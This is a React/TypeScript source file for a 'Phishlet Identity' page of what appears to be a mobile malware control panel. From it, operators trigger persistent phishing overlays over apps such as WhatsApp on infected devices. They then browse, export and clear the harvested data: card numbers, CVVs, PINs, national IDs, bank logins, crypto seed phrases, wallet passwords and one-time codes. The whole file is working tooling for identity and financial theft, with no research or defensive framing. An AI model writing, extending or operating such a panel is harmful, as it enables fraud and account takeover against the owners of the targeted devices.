import { useState, useCallback, useEffect, useRef } from 'react';
import { useOutletContext } from 'react-router-dom';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext } from '@/types';
import { clientsApi } from '@/services/api';
import { DevicePageHeader, ErrorAlert, LoadingSkeleton } from '@/components/device/shared';
import { DataActionsMenu, buildDataActions } from '@/components/device/DataActionsMenu';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import {
  ShieldAlert, Eye, User, CreditCard, Wallet, Building2,
  Globe, Lock, Phone, Mail, MapPin, Calendar, FileText,
  CheckCircle2, RefreshCw,
} from 'lucide-react';

interface PhishletDataItem {
  id: number;
  clientId: string;
  phishletType: string;
  stage: number;
  fieldName: string | null;
  fieldValue: string | null;
  fieldType: string | null;
  formData: string | null;
  capturedAt: string;
}

interface PhishletPageData {
  phishlet_data?: PhishletDataItem[];
}

const FIELD_ICONS: Record<string, React.ReactNode> = {
  fullName: <User className="h-3 w-3" />,
  dob: <Calendar className="h-3 w-3" />,
  nationalId: <FileText className="h-3 w-3" />,
  docNumber: <FileText className="h-3 w-3" />,
  bankAccount: <Building2 className="h-3 w-3" />,
  cardNumber: <CreditCard className="h-3 w-3" />,
  cardExpiry: <Calendar className="h-3 w-3" />,
  cardCvv: <Lock className="h-3 w-3" />,
  cardPin: <Lock className="h-3 w-3" />,
  phone: <Phone className="h-3 w-3" />,
  email: <Mail className="h-3 w-3" />,
  address: <MapPin className="h-3 w-3" />,
  cityState: <MapPin className="h-3 w-3" />,
  maidenName: <User className="h-3 w-3" />,
  occupation: <User className="h-3 w-3" />,
  cryptoWallet: <Wallet className="h-3 w-3" />,
  seedPhrase: <FileText className="h-3 w-3" />,
  walletAddress: <Wallet className="h-3 w-3" />,
  walletPassword: <Lock className="h-3 w-3" />,
  username: <User className="h-3 w-3" />,
  password: <Lock className="h-3 w-3" />,
  otp: <Lock className="h-3 w-3" />,
};

const FIELD_LABELS: Record<string, string> = {
  fullName: 'Full Legal Name',
  dob: 'Date of Birth',
  nationality: 'Nationality',
  nationalId: 'National ID / SSN',
  docType: 'Document Type',
  docNumber: 'Document Number',
  bankAccount: 'Bank Account Number',
  bankRouting: 'Bank Routing / SWIFT',
  cardNumber: 'Card Number',
  cardExpiry: 'Card Expiry',
  cardCvv: 'CVV',
  cardPin: 'Card PIN',
  income: 'Annual Income',
  phone: 'Phone Number',
  email: 'Email Address',
  address: 'Home Address',
  cityState: 'City / State / ZIP',
  maidenName: "Mother's Maiden Name",
  occupation: 'Occupation',
  cryptoWallet: 'Crypto Wallet Address',
  seedPhrase: 'Wallet Seed Phrase',
  walletAddress: 'Wallet Address',
  walletPassword: 'Wallet Password',
  username: 'Username',
  password: 'Password',
  otp: 'Security Code',
};

const SENSITIVE_FIELDS = ['password', 'pin', 'cvv', 'seed', 'walletPassword', 'cardPin', 'cardCvv'];

export default function PhishletPage() {
  const { clientId, loadClient, online } = useOutletContext<DeviceOutletContext>();
  const [activeTab, setActiveTab] = useState('kyc');
  const [clearing, setClearing] = useState(false);
  const [toast, setToast] = useState<string | null>(null);
  const toastTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const showToast = useCallback((msg: string) => {
    setToast(msg);
    if (toastTimer.current) clearTimeout(toastTimer.current);
    toastTimer.current = setTimeout(() => setToast(null), 3000);
  }, []);

  useEffect(() => {
    return () => { if (toastTimer.current) clearTimeout(toastTimer.current); };
  }, []);

  const { data: pageData, loading, error, refresh } = useDeviceData<PhishletPageData>({
    clientId,
    page: 'phishlet',
    extractData: (d) => ({
      phishlet_data: (d.phishlet_data || d.phishlet_captured || []) as PhishletDataItem[],
    }),
    dataType: ['phishlet_data'],
    defaultValue: {},
  });

  const triggerPhishlet = useCallback(async (type: string) => {
    if (!online) { showToast('Device is offline'); return; }
    try {
      await clientsApi.triggerPhishlet(clientId, {
        type,
        package: 'com.whatsapp',
        template: `${type}_identity`,
        persistent: true,
      });
      showToast(`${type} phishlet triggered`);
    } catch (e) {
      showToast('Failed to trigger phishlet');
    }
  }, [clientId, online, showToast]);

  const hidePhishlet = useCallback(async () => {
    if (!online) { showToast('Device is offline'); return; }
    try {
      await clientsApi.hidePhishlet(clientId);
      showToast('Phishlet hidden');
    } catch (e) {
      showToast('Failed to hide phishlet');
    }
  }, [clientId, online, showToast]);

  const clearData = useCallback(async () => {
    if (!online) { showToast('Device is offline'); return; }
    setClearing(true);
    try {
      await clientsApi.clearPhishletData(clientId);
      showToast('Phishlet data cleared');
      refresh();
    } catch (e) {
      showToast('Failed to clear data');
    } finally {
      setClearing(false);
    }
  }, [clientId, online, refresh, showToast]);

  const parsedData = (pageData?.phishlet_data || []).map((item) => {
    if (item.formData) {
      try {
        return { ...item, parsedForm: JSON.parse(item.formData) };
      } catch {
        return item;
      }
    }
    return item;
  });

  const menuActions = buildDataActions({
    data: pageData?.phishlet_data ?? [],
    exportPrefix: 'phishlet',
    onClear: () => void clearData(),
    extraActions: [
      { label: 'Refresh', icon: RefreshCw, onClick: () => void refresh() },
    ],
  });

  const filterByType = (type: string) =>
    parsedData.filter((d) => d.phishletType === type || (type === 'kyc' && !d.phishletType));

  const renderDataCard = (item: any, idx: number) => {
    const form = item.parsedForm || {};
    const entries = Object.entries(form).filter(([, v]) => v && String(v).trim());

    return (
      <Card key={idx} className="border-border/50">
        <CardHeader className="pb-2">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Badge variant="outline" className="text-[10px]">{item.phishletType || 'kyc'}</Badge>
              <span className="text-[10px] text-muted-foreground">Stage {item.stage || 1}</span>
            </div>
            <span className="text-[10px] text-muted-foreground">{new Date(item.capturedAt).toLocaleString()}</span>
          </div>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-1.5">
            {entries.map(([key, value]) => (
              <div key={key} className="flex items-center gap-2 p-1.5 rounded bg-muted/30">
                <div className="text-muted-foreground shrink-0">{FIELD_ICONS[key] || <FileText className="h-3 w-3" />}</div>
                <div className="min-w-0 flex-1">
                  <div className="text-[10px] text-muted-foreground">{FIELD_LABELS[key] || key}</div>
                  <div className="text-xs font-mono truncate">
                    {SENSITIVE_FIELDS.some(f => key.toLowerCase().includes(f)) ? '••••••••' : String(value)}
                  </div>
                </div>
              </div>
            ))}
          </div>
          {item.fieldName && !item.formData && (
            <div className="mt-2 p-1.5 rounded bg-muted/30">
              <div className="text-[10px] text-muted-foreground">{item.fieldName}</div>
              <div className="text-xs font-mono">{item.fieldValue}</div>
            </div>
          )}
        </CardContent>
      </Card>
    );
  };

  const types = ['kyc', 'bank', 'crypto', 'social', 'finance'];
  const typeLabels: Record<string, string> = { kyc: 'KYC Identity', bank: 'Bank Login', crypto: 'Crypto Wallet', social: 'Social', finance: 'Finance' };
  const typeIcons: Record<string, typeof User> = { kyc: User, bank: Building2, crypto: Wallet, social: Globe, finance: CreditCard };

  return (
    <div className="space-y-4">
      {toast && (
        <div className="fixed top-4 right-4 z-50 flex items-center gap-2 px-4 py-2 rounded-lg bg-indigo-600 text-white text-sm shadow-lg animate-in fade-in slide-in-from-top-2">
          <CheckCircle2 className="h-4 w-4" />
          {toast}
        </div>
      )}

      <DevicePageHeader
        title="Phishlet Identity"
        online={online}
        refresh={refresh}
        loading={loading}
        moreActions={
          <DataActionsMenu
            actions={menuActions}
            disabled={clearing || !parsedData.length}
            loadingLabel={clearing ? 'Clear Data' : null}
          />
        }
      />

      {error && <ErrorAlert message={error} onRetry={refresh} />}
      {loading && !parsedData.length && <LoadingSkeleton rows={3} />}

      <div className="grid grid-cols-1 xl:grid-cols-4 gap-4">
        <div className="xl:col-span-3 space-y-3">
          <Tabs value={activeTab} onValueChange={(v) => setActiveTab(v)} className="w-full">
            <TabsList className="grid w-full grid-cols-5">
              {types.map(t => (
                <TabsTrigger
                  key={t}
                  value={t}
                  className="text-xs"
                >
                  {typeLabels[t]}
                </TabsTrigger>
              ))}
            </TabsList>
            {types.map((type) => (
              <TabsContent key={type} value={type} className="mt-3 space-y-3">
                  {filterByType(type).length === 0 ? (
                    <Card>
                      <CardContent className="py-8 text-center">
                        <ShieldAlert className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
                        <p className="text-sm text-muted-foreground">No captured {type} data</p>
                        <p className="text-[10px] text-muted-foreground mt-1">Trigger a phishlet overlay to begin collection</p>
                      </CardContent>
                    </Card>
                  ) : (
                    filterByType(type).map((item, idx) => renderDataCard(item, idx))
                  )}
                </TabsContent>
            ))}
          </Tabs>
        </div>

        <div className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle className="text-sm flex items-center gap-2">
                <Eye className="h-4 w-4" />
                Quick Trigger
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-2">
              {types.map((type) => {
                const Icon = typeIcons[type];
                const colors: Record<string, string> = { kyc: 'bg-indigo-600', bank: 'bg-emerald-600', crypto: 'bg-amber-600', social: 'bg-sky-600', finance: 'bg-rose-600' };
                return (
                  <Button
                    key={type}
                    onClick={() => triggerPhishlet(type)}
                    disabled={!online}
                    size="sm"
                    className={`w-full ${colors[type]} hover:opacity-90 text-white text-xs`}
                  >
                    <Icon className="h-3 w-3 mr-1" />
                    {typeLabels[type]}
                  </Button>
                );
              })}
              <Button onClick={hidePhishlet} disabled={!online} variant="outline" size="sm" className="w-full text-xs">
                Hide All
              </Button>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="text-sm">Statistics</CardTitle>
            </CardHeader>
            <CardContent className="space-y-2">
              <div className="flex justify-between text-xs">
                <span className="text-muted-foreground">Total Captured</span>
                <span className="font-mono">{parsedData.length}</span>
              </div>
              {types.map(type => (
                <div key={type} className="flex justify-between text-xs">
                  <span className="text-muted-foreground">{typeLabels[type]}</span>
                  <span className="font-mono">{filterByType(type).length}</span>
                </div>
              ))}
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="text-sm">Identity Fields</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-1">
                {[
                  'Full Name', 'Date of Birth', 'National ID / SSN',
                  'ID Document Photo', 'Selfie Photo', 'Bank Account',
                  'Card Number', 'CVV / PIN', 'Phone Number',
                  'Email Address', 'Home Address', "Mother's Maiden Name",
                  'Occupation', 'Annual Income', 'Crypto Wallet', 'Seed Phrase',
                ].map((field) => (
                  <div key={field} className="flex items-center gap-1.5 text-xs">
                    <div className="w-1 h-1 rounded-full bg-indigo-400" />
                    {field}
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
